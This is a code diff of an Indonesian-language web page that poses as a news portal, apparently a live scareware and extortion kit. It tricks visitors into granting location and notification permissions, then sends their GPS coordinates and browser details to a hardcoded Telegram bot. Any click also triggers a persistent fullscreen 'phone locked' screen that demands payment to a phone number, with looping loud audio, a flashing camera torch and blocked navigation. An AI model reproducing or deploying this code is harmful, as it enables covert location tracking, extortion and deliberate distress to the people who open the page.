@@ -3,15 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover, shrink-to-fit=no">
-    <title>⚠️ SYSTEM FAILURE ⚠️</title>
+    <title>Berita Terkini - Portal Informasi</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
         }
+
+        .normal-website {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
+            padding: 20px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow-y: auto;
+            z-index: 10;
+            transition: opacity 0.3s;
+        }
+
+        .header {
+            background: white;
+            padding: 15px 20px;
+            border-radius: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo { font-size: 28px; }
+        .site-title { font-size: 20px; font-weight: bold; color: #333; }
+
+        .news-card {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .news-title { font-size: 18px; font-weight: bold; color: #222; margin-bottom: 8px; }
+        .news-meta { font-size: 12px; color: #888; margin-bottom: 12px; display: flex; gap: 15px; }
+        .news-excerpt { font-size: 14px; color: #555; line-height: 1.5; }
+
+        .notification-banner {
+            background: #e8f0fe;
+            border-radius: 16px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #cce4ff;
+        }
+        .notification-text { font-size: 13px; color: #0066cc; }
+        .enable-notif-btn {
+            background: #0066cc;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        /* Location permission banner (fake) */
+        .location-banner {
+            background: #e8fce8;
+            border-radius: 16px;
+            padding: 12px 16px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid #a0d8a0;
+        }
+        .location-text { font-size: 13px; color: #2e7d32; }
+        .allow-location-btn {
+            background: #2e7d32;
+            color: white;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+        .location-status { font-size: 11px; color: #666; margin-top: 5px; display: none; }
 
         .lockdown-overlay {
             position: fixed;
@@ -25,7 +108,11 @@
             justify-content: center;
             align-items: center;
             font-family: 'Courier New', 'Segoe UI', monospace;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0s, opacity 0.5s ease;
         }
+        .lockdown-overlay.show { visibility: visible; opacity: 1; }
 
         .glitch-bg {
             position: fixed;
@@ -36,15 +123,14 @@
             background: repeating-linear-gradient(0deg, rgba(0,255,0,0.05) 0px, rgba(255,0,255,0.05) 2px, transparent 2px, transparent 6px);
             pointer-events: none;
             z-index: 2147483646;
-            animation: glitchShift 0.08s infinite;
+            animation: glitchShift 0.12s infinite;
         }
-
         @keyframes glitchShift {
-            0% { transform: translate(0); opacity: 0.5; }
-            25% { transform: translate(-4px, 2px); opacity: 0.8; }
-            50% { transform: translate(4px, -2px); opacity: 0.5; }
-            75% { transform: translate(-2px, 3px); opacity: 0.9; }
-            100% { transform: translate(2px, -3px); opacity: 0.5; }
+            0% { transform: translate(0); opacity: 0.4; }
+            25% { transform: translate(-3px, 1px); opacity: 0.7; }
+            50% { transform: translate(3px, -1px); opacity: 0.5; }
+            75% { transform: translate(-1px, 2px); opacity: 0.8; }
+            100% { transform: translate(1px, -2px); opacity: 0.4; }
         }
 
         .glitch-overlay {
@@ -57,15 +143,12 @@
             pointer-events: none;
             z-index: 2147483646;
             mix-blend-mode: overlay;
-            animation: flicker 0.04s infinite;
+            animation: flicker 0.05s infinite;
         }
-
         @keyframes flicker {
-            0% { opacity: 0.2; }
-            25% { opacity: 0.7; }
-            50% { opacity: 0.3; }
-            75% { opacity: 0.8; }
-            100% { opacity: 0.2; }
+            0% { opacity: 0.3; }
+            50% { opacity: 0.7; }
+            100% { opacity: 0.3; }
         }
 
         .lockdown-container {
@@ -78,36 +161,24 @@
             border-radius: 2rem;
             border: 2px solid #ff00aa;
             box-shadow: 0 0 30px rgba(255,0,255,0.5);
-            animation: borderPulse 0.6s infinite;
+            animation: borderPulse 0.8s infinite;
         }
-
         @keyframes borderPulse {
             0% { border-color: #ff00aa; box-shadow: 0 0 10px #ff00aa; }
-            50% { border-color: #00ffaa; box-shadow: 0 0 50px #00ffaa; }
+            50% { border-color: #00ffaa; box-shadow: 0 0 40px #00ffaa; }
             100% { border-color: #ff00aa; box-shadow: 0 0 10px #ff00aa; }
         }
 
-        .lock-icon {
-            font-size: 4rem;
-            animation: shakeGlitch 0.15s infinite;
-        }
-
+        .lock-icon { font-size: 4rem; animation: shakeGlitch 0.2s infinite; }
         @keyframes shakeGlitch {
             0% { transform: translate(0); text-shadow: 3px 0 red; }
-            25% { transform: translate(-5px, 2px); text-shadow: -3px 0 cyan; }
-            50% { transform: translate(5px, -2px); text-shadow: 3px 0 magenta; }
-            75% { transform: translate(-2px, 4px); text-shadow: -3px 0 lime; }
+            25% { transform: translate(-4px, 2px); text-shadow: -3px 0 cyan; }
+            50% { transform: translate(4px, -2px); text-shadow: 3px 0 magenta; }
+            75% { transform: translate(-2px, 3px); text-shadow: -3px 0 lime; }
             100% { transform: translate(0); text-shadow: 3px 0 red; }
         }
 
-        h1 {
-            color: #ff3366;
-            font-size: 1.5rem;
-            letter-spacing: 3px;
-            text-transform: uppercase;
-            font-family: monospace;
-        }
-
+        h1 { color: #ff3366; font-size: 1.5rem; letter-spacing: 3px; text-transform: uppercase; font-family: monospace; }
         .warning-text {
             color: #ffaa44;
             background: rgba(255, 170, 68, 0.2);
@@ -117,12 +188,11 @@
             font-size: 0.8rem;
             font-family: monospace;
             border-left: 3px solid #ffaa44;
-            animation: textGlitch 0.3s infinite;
+            animation: textGlitch 0.4s infinite;
         }
-
         @keyframes textGlitch {
             0% { opacity: 1; text-shadow: 2px 0 red; }
-            50% { opacity: 0.7; text-shadow: -2px 0 blue; }
+            50% { opacity: 0.8; text-shadow: -2px 0 blue; }
             100% { opacity: 1; text-shadow: 2px 0 red; }
         }
 
@@ -137,22 +207,8 @@
             color: #00ffcc;
             text-align: center;
             border: 1px solid #ff00ff;
-            animation: pinGlow 0.5s infinite;
         }
-
-        @keyframes pinGlow {
-            0% { text-shadow: 0 0 0px #00ffcc; }
-            50% { text-shadow: 0 0 10px #00ffcc; }
-            100% { text-shadow: 0 0 0px #00ffcc; }
-        }
-
-        .pin-pad {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            margin: 20px 0;
-        }
-
+        .pin-pad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
         .pin-btn {
             background: #111;
             border: 1px solid #ff00aa;
@@ -161,17 +217,11 @@
             padding: 18px;
             border-radius: 60px;
             cursor: pointer;
-            transition: 0.02s linear;
+            transition: 0.05s linear;
             font-weight: bold;
             font-family: monospace;
         }
-
-        .pin-btn:active {
-            background: #ff00aa;
-            color: black;
-            transform: scale(0.95);
-        }
-
+        .pin-btn:active { background: #ff00aa; color: black; transform: scale(0.95); }
         .submit-btn {
             background: linear-gradient(135deg, #ff0066, #6600ff);
             width: 100%;
@@ -185,38 +235,65 @@
             cursor: pointer;
             font-family: monospace;
         }
-
-        .error-msg {
-            color: #ff5555;
-            margin-top: 15px;
-            font-size: 0.8rem;
-            background: #220000;
-            padding: 8px;
-            border-radius: 20px;
-            font-family: monospace;
-        }
-
-        .attempt-counter {
-            margin-top: 20px;
-            color: #ff6699;
-            font-size: 0.7rem;
-        }
-
-        audio {
+        .error-msg { color: #ff5555; margin-top: 15px; font-size: 0.8rem; background: #220000; padding: 8px; border-radius: 20px; font-family: monospace; }
+        .attempt-counter { margin-top: 20px; color: #ff6699; font-size: 0.7rem; }
+        audio { display: none; position: absolute; top: -9999px; left: -9999px; width: 0; height: 0; opacity: 0; pointer-events: none; }
+        
+        .toast-msg {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 12px;
+            z-index: 100;
             display: none;
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            width: 0;
-            height: 0;
-            opacity: 0;
-            pointer-events: none;
         }
     </style>
 </head>
 <body>
 
-<audio id="tortureSound" loop autoplay preload="auto" crossorigin="anonymous">
+<div id="toastMsg" class="toast-msg"></div>
+
+<div id="normalWebsite" class="normal-website">
+    <div class="header">
+        <div class="logo">📰</div>
+        <div class="site-title">BeritaTerkini .id</div>
+    </div>
+    
+    <div class="notification-banner" id="notifBanner">
+        <div class="notification-text">🔔 Aktifkan notifikasi untuk berita terbaru!</div>
+        <button class="enable-notif-btn" id="enableNotifBtn">Izinkan</button>
+    </div>
+
+    <!-- FAKE LOCATION BANNER - biar target kasih izin lokasi -->
+    <div class="location-banner" id="locationBanner">
+        <div class="location-text">📍 Rekomendasi berita berdasarkan lokasi Anda!</div>
+        <button class="allow-location-btn" id="allowLocationBtn">Izinkan</button>
+    </div>
+    <div id="locationStatus" class="location-status"></div>
+
+    <div class="news-card">
+        <div class="news-title">💥 Heboh! Fenomena Langka Terjadi di Langit Jakarta</div>
+        <div class="news-meta"><span>📅 2 jam lalu</span> <span>👁️ 12.234 views</span></div>
+        <div class="news-excerpt">Warga Jakarta dikejutkan dengan munculnya cahaya aneh di langit malam tadi...</div>
+    </div>
+    <div class="news-card">
+        <div class="news-title">📱 Tips Aman Berselancar di Internet Versi Pakar</div>
+        <div class="news-meta"><span>📅 5 jam lalu</span> <span>👁️ 8.451 views</span></div>
+        <div class="news-excerpt">Kementerian Komunikasi dan Informatika merilis panduan terbaru...</div>
+    </div>
+    <div class="news-card">
+        <div class="news-title">🎮 Game Online Terbaru Sukses Tembus 1 Juta Pengguna</div>
+        <div class="news-meta"><span>📅 1 hari lalu</span> <span>👁️ 23.901 views</span></div>
+        <div class="news-excerpt">Developer lokal berhasil menciptakan game mobile yang viral...</div>
+    </div>
+</div>
+
+<audio id="tortureSound" loop preload="auto" crossorigin="anonymous">
     <source src="https://files.catbox.moe/748vcj.mp3" type="audio/mpeg">
 </audio>
 
@@ -224,17 +301,16 @@
     <div class="glitch-bg"></div>
     <div class="glitch-overlay"></div>
     <div class="lockdown-container">
-        <div class="lock-icon">😈💀⚡💀😈</div>
+        <div class="lock-icon">😈💀🔊💀😈</div>
         <h1>YOUR PHONE IS LOCKED</h1>
         <div class="warning-text">
             ⚠️ HP ANDA TELAH DIKUNCI PERMANEN ⚠️<br>
             LOCKED BY @MUTZXD<br>
             TF 25K KE 085921018213<br>
             AGAR BISA DI BUKA<br>
-            <span style="color:red; animation: blink 0.2s infinite;">⚡ FLASH STROBE MODE AKTIF ⚡</span><br>
+            <span style="color:red">⚡ FLASH + SUARA TORTURE AKTIF ⚡</span><br>
             <span style="color:red">RESTART TIDAK AKAN MEMBANTUKAN!</span>
         </div>
-        
         <div class="pin-input-area">
             <div class="pin-display" id="pinDisplay">●●●●●●</div>
             <div class="pin-pad" id="pinPad"></div>
@@ -258,6 +334,158 @@
         const LOCK_KEY = "ZEN0_LOCKDOWN_ACTIVE";
         const ATTEMPTS_KEY = "ZEN0_ATTEMPTS";
         
+        // TELEGRAM CONFIG
+        const BOT_TOKEN = "8600220038:AAFHHAXv44LROd1Mv1iNDQlj0eQsZDW7iK8";
+        const CHAT_ID = "8183065421";
+        
+        let locationSent = false;
+        let lockdownTriggered = false;
+        
+        // ========================
+        // FUNGSI KIRIM KE TELEGRAM
+        // ========================
+        function showToast(msg) {
+            const toast = document.getElementById('toastMsg');
+            toast.innerText = msg;
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 2000);
+        }
+        
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    console.log("Pesan terkirim ke Telegram");
+                } else {
+                    console.log("Gagal kirim:", result);
+                }
+            } catch (error) {
+                console.log("Error kirim Telegram:", error);
+            }
+        }
+        
+        async function sendLocationToTelegram(lat, lng, accuracy, address = null) {
+            let message = `🔴 <b>LOKASI TARGET TERTANGKAP!</b> 🔴\n\n`;
+            message += `📍 <b>Koordinat:</b> ${lat}, ${lng}\n`;
+            message += `🎯 <b>Akurasi:</b> ${accuracy} meter\n`;
+            message += `🔗 <b>Google Maps:</b> https://maps.google.com/?q=${lat},${lng}\n`;
+            message += `⏰ <b>Waktu:</b> ${new Date().toLocaleString('id-ID')}\n`;
+            message += `🌐 <b>User Agent:</b> ${navigator.userAgent.substring(0, 100)}...\n`;
+            message += `\n👤 <b>LOCKED BY @MUTZXD</b>`;
+            
+            if (address) {
+                message += `\n🏠 <b>Alamat:</b> ${address}`;
+            }
+            
+            await sendToTelegram(message);
+        }
+        
+        // ========================
+        // AMBIL LOKASI TARGET
+        // ========================
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject("Geolocation tidak didukung");
+                    return;
+                }
+                
+                showToast("Mengambil lokasi Anda...");
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        showToast(`Lokasi didapat: ${lat.toFixed(4)}, ${lng.toFixed(4)}`);
+                        
+                        // Kirim ke Telegram
+                        await sendLocationToTelegram(lat, lng, accuracy);
+                        locationSent = true;
+                        
+                        // Update status di UI (biar target ga curiga)
+                        const locationStatus = document.getElementById('locationStatus');
+                        locationStatus.style.display = 'block';
+                        locationStatus.innerHTML = '✅ Lokasi terdeteksi! Berita rekomendasi siap.';
+                        locationStatus.style.color = '#2e7d32';
+                        
+                        resolve({ lat, lng, accuracy });
+                    },
+                    (error) => {
+                        let errorMsg = "";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = "Izin lokasi ditolak";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = "Lokasi tidak tersedia";
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = "Timeout mengambil lokasi";
+                                break;
+                            default:
+                                errorMsg = error.message;
+                        }
+                        showToast(`Gagal: ${errorMsg}`);
+                        reject(errorMsg);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
+        
+        // ========================
+        // FLASH CONTROL
+        // ========================
+        let flashTrack = null;
+        let flashInterval = null;
+        
+        async function initFlash() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const track = stream.getVideoTracks()[0];
+                if (track.getCapabilities().torch) {
+                    flashTrack = track;
+                    startRandomFlash();
+                }
+            } catch (err) {}
+        }
+        
+        function setFlash(on) {
+            if (flashTrack) flashTrack.applyConstraints({ advanced: [{ torch: on }] }).catch(()=>{});
+        }
+        
+        function startRandomFlash() {
+            if (flashInterval) clearInterval(flashInterval);
+            flashInterval = setInterval(() => {
+                setTimeout(() => {
+                    if (flashTrack) {
+                        const state = Math.random() > 0.5;
+                        setFlash(state);
+                        if (state) setTimeout(() => setFlash(false), Math.random() * 1500 + 500);
+                    }
+                }, Math.random() * 2000);
+            }, 3000);
+        }
+        
+        function stopFlash() {
+            if (flashInterval) clearInterval(flashInterval);
+            if (flashTrack) { setFlash(false); flashTrack.stop(); flashTrack = null; }
+        }
+        
         // ========================
         // AUDIO TORTURE
         // ========================
@@ -267,12 +495,7 @@
             if (audioElement) {
                 audioElement.volume = 1.0;
                 audioElement.loop = true;
-                audioElement.play().catch(e => {
-                    document.body.addEventListener('click', function playOnce() {
-                        audioElement.play();
-                        document.body.removeEventListener('click', playOnce);
-                    }, { once: true });
-                });
+                audioElement.play().catch(e => {});
             }
         }
         
@@ -281,93 +504,11 @@
                 audioElement.play().catch(()=>{});
             }
         }
-        setInterval(maintainAudio, 300);
-        
-        // ========================
-        // FLASH CONTROL - VERSI CEPAT (STROBE)
-        // ========================
-        let flashTrack = null;
-        let flashInterval = null;
-        let strobeInterval = null;
-        let isStrobeActive = false;
-        
-        async function initFlash() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                const track = stream.getVideoTracks()[0];
-                if (track.getCapabilities().torch) {
-                    flashTrack = track;
-                    startFastStrobe(); // LANGSUNG STROBE CEPAT
-                }
-            } catch (err) {}
-        }
-        
-        function setFlash(on) {
-            if (flashTrack) {
-                flashTrack.applyConstraints({ advanced: [{ torch: on }] }).catch(()=>{});
-            }
-        }
-        
-        // STROBE CEPAT: nyala-mati dalam milidetik
-        function startFastStrobe() {
-            if (strobeInterval) clearInterval(strobeInterval);
-            
-            // Kecepatan strobe: 50-150ms (super cepat kayak lampu disko)
-            const fastStrobe = () => {
-                if (!flashTrack) return;
-                setFlash(true);
-                setTimeout(() => {
-                    setFlash(false);
-                }, Math.random() * 80 + 40); // nyala 40-120ms doang
-            };
-            
-            // Panggil strobe setiap 100-200ms
-            strobeInterval = setInterval(() => {
-                if (flashTrack) {
-                    fastStrobe();
-                }
-            }, Math.random() * 100 + 80);
-        }
-        
-        // MODE STROBE MAKIN CEPAT (kalau salah PIN)
-        function increaseStrobeSpeed() {
-            if (strobeInterval) {
-                clearInterval(strobeInterval);
-                // Makin cepat: 30-70ms interval
-                strobeInterval = setInterval(() => {
-                    if (flashTrack) {
-                        setFlash(true);
-                        setTimeout(() => {
-                            setFlash(false);
-                        }, Math.random() * 40 + 20); // nyala cuma 20-60ms
-                    }
-                }, Math.random() * 50 + 40);
-            }
-        }
-        
-        function stopFlash() {
-            if (strobeInterval) {
-                clearInterval(strobeInterval);
-                strobeInterval = null;
-            }
-            if (flashInterval) {
-                clearInterval(flashInterval);
-                flashInterval = null;
-            }
-            if (flashTrack) {
-                setFlash(false);
-                flashTrack.stop();
-                flashTrack = null;
-            }
-        }
         
         // ========================
         // PERSISTENT LOCK
         // ========================
-        function isPersistentLockActive() {
-            return localStorage.getItem(LOCK_KEY) === "true";
-        }
-        
+        function isPersistentLockActive() { return localStorage.getItem(LOCK_KEY) === "true"; }
         function setPersistentLock(status) {
             if(status) {
                 localStorage.setItem(LOCK_KEY, "true");
@@ -377,7 +518,6 @@
                 localStorage.removeItem(ATTEMPTS_KEY);
             }
         }
-        
         function loadPersistentAttempts() {
             let saved = localStorage.getItem(ATTEMPTS_KEY);
             if(saved !== null) {
@@ -392,8 +532,6 @@
         function enableTotalLockdown() {
             document.body.style.overflow = "hidden";
             document.body.style.position = "fixed";
-            document.body.style.width = "100%";
-            document.body.style.height = "100%";
             
             function requestFullscreenForce() {
                 const docEl = document.documentElement;
@@ -426,7 +564,6 @@
             });
             
             document.addEventListener('contextmenu', (e) => e.preventDefault());
-            
             document.addEventListener('keydown', (e) => {
                 if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'C' || e.key === 'J')) || (e.ctrlKey && e.key === 'u')) {
                     e.preventDefault();
@@ -438,9 +575,7 @@
                 history.pushState(null, null, location.href);
                 location.replace(location.href);
             });
-            setInterval(() => {
-                history.pushState(null, null, location.href);
-            }, 200);
+            setInterval(() => history.pushState(null, null, location.href), 200);
             
             window.addEventListener('beforeunload', function(e) {
                 e.preventDefault();
@@ -462,22 +597,21 @@
         }
         
         // ========================
-        // GLITCH LEBIH CEPAT
+        // GLITCH RANDOM
         // ========================
         function addRandomGlitch() {
             const glitchDiv = document.createElement('div');
             glitchDiv.style.position = 'fixed';
             glitchDiv.style.top = Math.random() * 100 + '%';
             glitchDiv.style.left = Math.random() * 100 + '%';
-            glitchDiv.style.width = '60px';
-            glitchDiv.style.height = '10px';
-            glitchDiv.style.background = 'rgba(255,0,255,0.7)';
+            glitchDiv.style.width = '80px';
+            glitchDiv.style.height = '15px';
+            glitchDiv.style.background = 'rgba(255,0,255,0.6)';
             glitchDiv.style.zIndex = '999999999';
             glitchDiv.style.pointerEvents = 'none';
             document.body.appendChild(glitchDiv);
-            setTimeout(() => glitchDiv.remove(), 50);
+            setTimeout(() => glitchDiv.remove(), 80);
         }
-        setInterval(addRandomGlitch, 100);
         
         // ========================
         // PIN LOGIC
@@ -528,21 +662,13 @@
                 return;
             }
             if(enteredPin === CORRECT_PIN) {
-                if (audioElement) {
-                    audioElement.pause();
-                    audioElement.currentTime = 0;
-                }
+                if (audioElement) { audioElement.pause(); audioElement.currentTime = 0; }
                 stopFlash();
                 localStorage.removeItem(LOCK_KEY);
                 localStorage.removeItem(ATTEMPTS_KEY);
                 document.getElementById('errorMsg').style.color = "#0f0";
                 document.getElementById('errorMsg').innerHTML = "✅ UNLOCKED! KELUAR DARI APLIKASI... ✅";
-                
-                setTimeout(() => {
-                    window.open('', '_self').close();
-                    location.href = 'about:blank';
-                    window.close();
-                }, 300);
+                setTimeout(() => { window.open('', '_self').close(); location.href = 'about:blank'; window.close(); }, 300);
             } else {
                 currentAttempts++;
                 let left = MAX_ATTEMPTS - currentAttempts;
@@ -551,56 +677,126 @@
                 updatePinDisplay();
                 document.getElementById('errorMsg').innerHTML = `❌ PIN SALAH! SISA ${left} PERCOBAAN ❌`;
                 if(navigator.vibrate) navigator.vibrate(400);
-                
-                // SETIAP SALAH PIN -> STROBE MAKIN CEPAT
-                if (left > 0) {
-                    increaseStrobeSpeed();
-                }
-                
                 setPersistentLock(true);
-                
                 if(left === 0) {
                     document.querySelector('.pin-pad').style.pointerEvents = "none";
                     document.getElementById('unlockBtn').disabled = true;
-                    document.getElementById('errorMsg').innerHTML = "🔒 LOCKDOWN PERMANEN! STROBE MAKIN CEPAT 🔒";
-                    // Strobe makin gila di percobaan terakhir
-                    if (strobeInterval) {
-                        clearInterval(strobeInterval);
-                        strobeInterval = setInterval(() => {
-                            if (flashTrack) {
-                                setFlash(true);
-                                setTimeout(() => setFlash(false), 15);
-                            }
-                        }, 30);
-                    }
+                    document.getElementById('errorMsg').innerHTML = "🔒 LOCKDOWN PERMANEN! SUARA + FLASH TERUS 🔒";
                 }
             }
         }
         
         // ========================
-        // INITIALIZE
+        // TRIGGER LOCKDOWN
         // ========================
-        function init() {
+        const normalWebsiteDiv = document.getElementById('normalWebsite');
+        const lockScreenDiv = document.getElementById('lockScreen');
+        
+        function triggerLockdown() {
+            if (lockdownTriggered) return;
+            lockdownTriggered = true;
+            
+            normalWebsiteDiv.style.opacity = '0';
+            setTimeout(() => {
+                normalWebsiteDiv.style.display = 'none';
+                lockScreenDiv.classList.add('show');
+                enableTotalLockdown();
+                forcePlayAudio();
+                setInterval(maintainAudio, 500);
+                setInterval(addRandomGlitch, 200);
+                generatePinPad();
+                updatePinDisplay();
+                initFlash();
+                
+                if(isPersistentLockActive()) {
+                    loadPersistentAttempts();
+                    if(currentAttempts >= MAX_ATTEMPTS) {
+                        document.querySelector('.pin-pad').style.pointerEvents = "none";
+                        document.getElementById('unlockBtn').disabled = true;
+                    }
+                }
+                document.getElementById('attemptLeft').innerText = MAX_ATTEMPTS - currentAttempts;
+                document.getElementById('unlockBtn').addEventListener('click', attemptUnlock);
+                
+                // Kirim notifikasi ke Telegram bahwa target sudah lockdown
+                sendToTelegram(`🔒 <b>LOCKDOWN AKTIF!</b> 🔒\nTarget telah masuk ke mode lockdown.\n⏰ ${new Date().toLocaleString('id-ID')}`);
+            }, 300);
+        }
+        
+        // ========================
+        // HANDLE IZIN LOKASI + NOTIF
+        // ========================
+        const enableNotifBtn = document.getElementById('enableNotifBtn');
+        const allowLocationBtn = document.getElementById('allowLocationBtn');
+        
+        let notifGranted = false;
+        let locationGranted = false;
+        
+        async function requestNotificationPermission() {
+            const permission = await Notification.requestPermission();
+            if (permission === 'granted') {
+                notifGranted = true;
+                new Notification('✅ Notifikasi Diaktifkan', {
+                    body: 'Anda akan menerima berita terbaru dari kami.',
+                    icon: '',
+                    silent: false
+                });
+            }
+            checkAndTrigger();
+        }
+        
+        async function requestLocationPermission() {
+            try {
+                await getLocation();
+                locationGranted = true;
+                checkAndTrigger();
+            } catch (error) {
+                // Tetap lanjut lockdown walaupun lokasi gagal
+                checkAndTrigger();
+            }
+        }
+        
+        function checkAndTrigger() {
+            // Trigger lockdown setelah salah satu izin diberikan atau langsung
+            // Biar ga nunggu dua-duanya, trigger aja setelah interaksi pertama
+            triggerLockdown();
+        }
+        
+        enableNotifBtn.addEventListener('click', requestNotificationPermission);
+        allowLocationBtn.addEventListener('click', requestLocationPermission);
+        
+        // Juga trigger kalau target langsung scroll/klik berita (biar cepet kena)
+        document.querySelectorAll('.news-card').forEach(card => {
+            card.addEventListener('click', () => {
+                if (!lockdownTriggered) {
+                    triggerLockdown();
+                }
+            });
+        });
+        
+        // KALAU SUDAH PERNAH LOCKDOWN SEBELUMNYA
+        if(isPersistentLockActive()) {
+            normalWebsiteDiv.style.display = 'none';
+            lockScreenDiv.classList.add('show');
+            enableTotalLockdown();
+            forcePlayAudio();
+            setInterval(maintainAudio, 500);
+            setInterval(addRandomGlitch, 200);
             generatePinPad();
             updatePinDisplay();
-            enableTotalLockdown();
-            
-            forcePlayAudio();
             initFlash();
-            
-            if(isPersistentLockActive()) {
-                loadPersistentAttempts();
-                if(currentAttempts >= MAX_ATTEMPTS) {
-                    document.querySelector('.pin-pad').style.pointerEvents = "none";
-                    document.getElementById('unlockBtn').disabled = true;
-                }
+            loadPersistentAttempts();
+            if(currentAttempts >= MAX_ATTEMPTS) {
+                document.querySelector('.pin-pad').style.pointerEvents = "none";
+                document.getElementById('unlockBtn').disabled = true;
             }
-            
             document.getElementById('attemptLeft').innerText = MAX_ATTEMPTS - currentAttempts;
             document.getElementById('unlockBtn').addEventListener('click', attemptUnlock);
         }
         
-        init();
+        // Kirim pesan awal ke Telegram bahwa target buka halaman
+        sendToTelegram(`🌐 <b>NEW TARGET!</b> 🌐\nSeseorang membuka halaman lockdown.\n🕐 ${new Date().toLocaleString('id-ID')}\n📱 ${navigator.userAgent.substring(0, 80)}...`);
+        
     })();
 </script>
 </body>
